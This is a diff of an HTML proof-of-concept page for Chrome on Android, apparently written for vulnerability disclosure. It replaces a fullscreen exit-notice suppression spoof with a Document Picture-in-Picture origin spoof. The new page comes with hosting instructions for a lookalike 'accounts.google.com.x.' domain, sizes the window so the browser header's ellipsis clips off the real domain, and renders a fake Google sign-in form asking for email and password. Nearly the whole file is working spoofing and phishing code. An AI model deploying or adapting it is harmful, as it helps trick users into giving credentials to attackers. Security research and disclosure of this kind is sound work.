@@ -1,107 +1,86 @@
 <!DOCTYPE html>
+<!--
+  Android Document-PiP origin-spoof POC.
+
+  Host this page at:
+      https://accounts.google.com.x.<YOUR-ETLD+1>/poc.html
+  (any long left-anchored "trusted-looking" prefix works; the registrable
+  domain at the right end is what gets clipped).
+
+  The Android Document-PiP header renders the opener hostname via raw
+  GURL.getHost() into a singleLine TextView with android:ellipsize="end"
+  (tail elision). It never calls UrlFormatter.formatUrlForSecurityDisplay()
+  and never scrolls/elides to keep the eTLD+1 visible. By choosing a narrow
+  PiP window width, the attacker clips the registrable domain off the right
+  edge so the always-on-top trusted header reads "accounts.google.comâ€¦".
+-->
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Fullscreen exit-notice suppression (Android)</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>tap to continue</title>
 <style>
-  html, body { margin: 0; height: 100%; font-family: sans-serif; }
-  #stage {
-    height: 100%; display: flex; flex-direction: column;
-    align-items: center; justify-content: center; gap: 16px;
-    background: #111; color: #eee;
-  }
-  button { font-size: 18px; padding: 14px 22px; }
-  #log { font-size: 12px; max-width: 90vw; white-space: pre-wrap; }
-  #spoof {
-    display: none; position: fixed; inset: 0; background: #fff; color: #000;
-  }
-  #spoof.on { display: block; }
-  /* Fake browser chrome shown once we believe the real exit notice is gone */
-  #fakebar {
-    height: 56px; background: #f1f3f4; border-bottom: 1px solid #ccc;
-    display: flex; align-items: center; padding: 0 12px; font-size: 14px;
-  }
-  #fakeurl {
-    flex: 1; background: #fff; border: 1px solid #ccc; border-radius: 20px;
-    padding: 8px 14px;
-  }
+  body { font-family: Roboto, sans-serif; margin: 2em; }
+  button { font-size: 1.2em; padding: .8em 1.4em; }
 </style>
 </head>
 <body>
-<div id="stage">
-  <div><b>Chrome for Android — fullscreen exit-notice suppression</b></div>
-  <button id="prep">Step&nbsp;1: open helper popup</button>
-  <button id="go">Step&nbsp;2: enter fullscreen (tap = user activation)</button>
-  <div id="log"></div>
-</div>
-
-<!-- Spoofed UI shown after the security notice is suppressed -->
-<div id="spoof">
-  <div id="fakebar">
-    <span style="margin-right:8px">&#x1f512;</span>
-    <div id="fakeurl">https://accounts.example-bank.com/login</div>
-  </div>
-  <div style="padding:24px">
-    <h2>Sign in</h2>
-    <p>The real "swipe down to exit full screen" notice has been suppressed.
-       The user has no on-screen instruction telling them they are in
-       tab-fullscreen. Everything above this line is attacker-drawn.</p>
-  </div>
-</div>
+<p>Tap the button (single user gesture, no permission prompt):</p>
+<button id="go">Sign in with Google</button>
+<pre id="log"></pre>
 
 <script>
-const log = m => {
-  document.getElementById('log').textContent += m + "\n";
-  console.log(m);
-};
+const log = m => document.getElementById('log').textContent += m + '\n';
 
-let popup = null;
-
-// Step 1: open a script-openable tab so we can later call popup.close().
-// NOTE: per source audit, TabModelSelectorImpl.onCloseContents() sets
-// allowUndo(false), so this does NOT enqueue an UndoBar TYPE_ACTION snackbar.
-// Kept here to demonstrate the *attempted* deterministic vector and to make
-// manual testing of any future regression trivial.
-document.getElementById('prep').onclick = () => {
-  popup = window.open('about:blank', '_blank');
-  log(popup ? "[+] helper popup opened" : "[!] popup blocked");
-};
-
-document.getElementById('go').onclick = async () => {
-  try {
-    await document.documentElement.requestFullscreen({ navigationUI: "hide" });
-    log("[+] requestFullscreen() resolved");
-  } catch (e) {
-    log("[!] requestFullscreen() rejected: " + e);
+document.getElementById('go').addEventListener('click', async () => {
+  if (!('documentPictureInPicture' in window)) {
+    log('documentPictureInPicture API not available.');
+    log('On Android, enable chrome://flags#enable-android-document-picture-in-picture');
     return;
   }
+  try {
+    // Width chosen so the header URL bar (squeezed between two 48dp icons
+    // + 6dp margins, weight=1) fits roughly "accounts.google.com" before
+    // the right-edge ellipsis. Tune per device DPI / font metrics.
+    // Android pinned-window minimum is 220dp; header min-unoccluded floor
+    // is 156dp, so the URL TextView can be driven down to ~50-60dp wide.
+    const pip = await documentPictureInPicture.requestWindow({
+      width: 230,
+      height: 320,
+    });
 
-  // ---- Vector 1 (blocked in current tree): script-closed tab -> UndoBar ----
-  // Fired immediately so that, *if* an UndoBar were produced, it would
-  // addFirst() over the ExclusiveAccessBubble snackbar that was just queued.
-  if (popup && !popup.closed) {
-    setTimeout(() => {
-      try { popup.close(); log("[*] popup.close() sent"); } catch (e) {}
-    }, 50);
+    // Phishing payload rendered in the child WebContents, beneath the
+    // browser-drawn header that now appears to attribute it to google.com.
+    pip.document.head.innerHTML = `
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <style>
+        body{margin:0;font-family:Roboto,Arial,sans-serif;background:#fff;
+             display:flex;flex-direction:column;align-items:center;
+             padding:18px 14px;box-sizing:border-box}
+        img{width:64px;height:64px;margin-bottom:8px}
+        h1{font-size:15px;font-weight:400;color:#202124;margin:0 0 14px}
+        input{width:100%;padding:10px;margin:5px 0;border:1px solid #dadce0;
+              border-radius:4px;font-size:13px;box-sizing:border-box}
+        button{width:100%;background:#1a73e8;color:#fff;border:0;
+               border-radius:4px;padding:10px;font-size:13px;margin-top:8px}
+      </style>`;
+    pip.document.body.innerHTML = `
+      <svg width="60" height="60" viewBox="0 0 48 48">
+        <path fill="#4285F4" d="M45 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h11.8c-.5 2.8-2 5.1-4.3 6.7v5.6h7C42.6 37 45 31.3 45 24.5z"/>
+        <path fill="#34A853" d="M24 46c5.9 0 10.8-2 14.4-5.2l-7-5.6c-2 1.3-4.5 2.1-7.4 2.1-5.7 0-10.5-3.8-12.2-9H4.6v5.7C8.2 41.1 15.5 46 24 46z"/>
+        <path fill="#FBBC05" d="M11.8 28.3c-.4-1.3-.7-2.8-.7-4.3s.2-3 .7-4.3v-5.7H4.6C3.1 17.1 2.3 20.5 2.3 24s.8 6.9 2.3 10l7.2-5.7z"/>
+        <path fill="#EA4335" d="M24 10.7c3.2 0 6.1 1.1 8.4 3.3l6.3-6.3C34.8 4.1 29.9 2 24 2 15.5 2 8.2 6.9 4.6 14l7.2 5.7c1.7-5.2 6.5-9 12.2-9z"/>
+      </svg>
+      <h1>Sign in</h1>
+      <input type="email"    placeholder="Email or phone" autocomplete="username">
+      <input type="password" placeholder="Password"       autocomplete="current-password">
+      <button>Next</button>`;
+
+    log('PiP opened. Observe the header origin text.');
+    log('Opener host = ' + location.host);
+  } catch (e) {
+    log('requestWindow failed: ' + e);
   }
-
-  // ---- Vector 2 (works, but needs user gesture): swipe-to-dismiss ----------
-  // SnackbarView wires SnackbarSwipeHandler unconditionally; a horizontal
-  // swipe on the security notice removes it with no re-show
-  // (ExclusiveAccessContextAndroid::OnExclusiveAccessUserInput is a no-op).
-  log("[*] Now SWIPE the bottom snackbar horizontally.");
-
-  // After the snackbar's lifetime, reveal the spoofed browser chrome.
-  // Default TYPE_ACTION duration + cascade window ≈ 10s.
-  setTimeout(() => {
-    document.getElementById('spoof').classList.add('on');
-    log("[+] spoof UI shown — no exit instruction remains on screen");
-  }, 11000);
-};
-
-document.addEventListener('fullscreenchange', () => {
-  log("fullscreenElement = " + (document.fullscreenElement ? "<html>" : "null"));
 });
 </script>
 </body>
